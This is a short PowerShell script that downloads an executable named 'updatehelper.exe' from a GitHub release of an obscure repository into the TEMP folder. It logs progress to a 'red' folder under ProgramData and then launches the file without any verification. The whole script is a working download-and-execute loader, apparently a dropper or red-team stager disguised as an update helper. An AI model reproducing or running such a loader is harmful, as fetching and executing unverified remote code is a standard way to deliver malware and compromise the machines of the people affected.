$ErrorActionPreference = "Stop"
$url = "https://github.com/wabor1/test/releases/download/1/updatehelper.exe"
$target = "$env:TEMP\updatehelper.exe"
$log = "$env:ProgramData\red\download.log"

"Starting download: $(Get-Date)" | Out-File $log

$client = [System.Net.WebClient]::new()
$client.DownloadFileAsync([Uri]$url, $target)

while ($client.IsBusy) {
    $size = if (Test-Path $target) { [math]::Round((Get-Item $target).Length / 1MB, 2) } else { 0 }
    "Downloaded: ${size} MB" | Out-File $log -Append
    Start-Sleep -Seconds 2
}

$client.Dispose()
"Download complete. Launching..." | Out-File $log -Append
Start-Process $target   
